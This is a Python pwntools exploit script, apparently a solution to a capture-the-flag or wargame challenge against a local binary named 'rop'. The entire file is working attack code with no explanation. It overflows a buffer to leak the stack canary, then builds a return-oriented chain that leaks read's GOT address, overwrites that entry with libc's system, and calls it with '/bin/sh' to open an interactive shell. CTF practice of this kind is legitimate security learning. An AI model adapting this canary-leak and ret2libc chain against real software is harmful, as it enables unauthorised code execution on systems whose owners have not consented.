from pwn import *

def slog(name, addr): return success(': '.join([name, hex(addr)]))

context.log_level = 'debug'
context.arch = 'amd64'

# p = process('./rop')
p = process('./rop', env= {"LD_PRELOAD": "./lib.so.6"})
e = ELF('./rop')
libc = ELF('./libc.so.6')

# Get canary leak
buf = b"A"*0x39
p.sendafter(b"Buf: ", buf)
p.recvuntil(buf)
cnry = u64(b"\x00" + p.recvn(7))
slog('canary', cnry)

pop_rdi = 0x0000000000400853
pop_rsi_r15 = 0x0000000000400851
ret = 0x0000000000400596
read_got = e.got['read']
read_plt = e.plt['read']
write_plt = e.plt['write']

payload = b"A"*0x38 + p64(cnry) + b"B"*0x8

# write(1, read_got, ...)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

# read(0, read_got, ...) -> send system + "/bin/sh"
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

# Call read("/bin/sh") => jump to system() with rdi = read_got+8("/bin/sh")
payload += p64(pop_rdi) + p64(read_got+0x8)
payload += p64(ret)
payload += p64(read_plt)

p.sendafter(b"Buf: ", payload)
read = u64(p.recvn(6) + b"\x00"*2)
system = read - libc.symbols['read'] + libc.symbols['system']
slog('system', system)

p.send(p64(system) + b"/bin/sh\x00")
p.interactive()
